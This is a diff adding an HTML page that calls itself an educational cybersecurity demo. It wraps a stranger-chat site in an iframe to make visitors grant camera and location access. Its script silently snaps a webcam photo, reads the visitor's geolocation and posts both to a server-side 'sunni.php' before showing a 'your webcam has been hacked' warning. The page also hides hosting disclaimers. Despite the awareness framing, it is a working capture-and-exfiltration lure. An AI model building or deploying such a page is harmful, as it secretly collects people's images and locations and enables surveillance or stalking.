@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Educational Cybersecurity Demo</title>
+    <style>
+        img[alt*="www.000webhost.com"], .disclaimer { display: none; }
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        #popup, #alertPopup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            max-width: 600px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+            text-align: center;
+            border-radius: 10px;
+        }
+        #popup img {
+            max-width: 100%;
+            margin-bottom: 20px;
+        }
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.75);
+            z-index: 999;
+        }
+        .advice, #alertPopup p {
+            color: #333;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            function showPopup(imageSrc) {
+                $('#popup img').attr('src', imageSrc);
+                $('#popup').fadeIn();
+                $('#overlay').fadeIn();
+                var audio = new Audio('https://connectwithstrangers.com/voice.mp3'); // Ensure the URL is correct and accessible
+                audio.play().catch(e => console.error('Error playing sound:', e));
+            }
+
+            function showAlert() {
+                $('#alertPopup').fadeIn();
+                $('#overlay').fadeIn();
+            }
+
+            async function captureImageAndSendData(video, canvas, context) {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageSrc = canvas.toDataURL('image/png');
+                if (imageSrc) {
+                    showPopup(imageSrc);
+                } else {
+                    console.error('Failed to capture image.');
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        $.post('sunni.php', {
+                            image: imageSrc,
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    },
+                    () => { showAlert(); },
+                    { timeout: 10000 }
+                );
+            }
+
+            async function init() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = function() {
+                        const canvas = document.getElementById('canvas');
+                        const context = canvas.getContext('2d');
+                        setTimeout(() => captureImageAndSendData(video, canvas, context), 1000); // Adjust timing as necessary
+                    };
+                } catch (e) {
+                    showAlert();
+                }
+            }
+
+            init();
+        });
+    </script>
+</head>
+<body>
+    <div id="overlay"></div>
+    <div id="popup">
+        <img src="" alt="Captured Image">
+        <div class="advice">
+            <strong>Your webcam has been hacked,</strong> but don't worry—this site is designed to show how hackers might access your camera.
+            <p>Advice: Verify the legitimacy of websites before allowing camera or location access. For more details on how to protect yourself, <a href="https://ranjithadlakadi.com/educating-webcam-hacking" target="_blank">watch this video</a>.</p>
+            <button onclick="window.location.href='https://ranjithadlakadi.com/educating-webcam-hacking'">Learn how to protect yourself</button>
+        </div>
+    </div>
+    <div id="alertPopup">
+        <p>Please allow all permissions to continue to chat with strangers.</p>
+        <button onclick="$('#alertPopup').fadeOut(); $('#overlay').fadeOut();">OKAY</button>
+    </div>
+    <iframe src="https://strangercamchat.com" sandbox="allow-scripts allow-same-origin"></iframe>
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+</body>
+</html>
